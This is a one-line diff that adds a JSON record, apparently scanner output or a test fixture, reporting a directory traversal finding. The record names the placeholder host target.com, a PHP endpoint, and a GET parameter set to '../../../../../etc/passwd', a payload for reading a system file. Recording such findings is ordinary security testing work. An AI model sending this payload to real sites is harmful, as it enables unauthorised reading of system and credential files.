@@ -1,0 +1,1 @@
+{"class": "Directory Traversal", "result": {"http://target.com": [{"endpoint": "/directorytraversal/directorytraversal.php", "params": {"ascii": "../../../../../etc/passwd"}, "method": "GET"}]}}
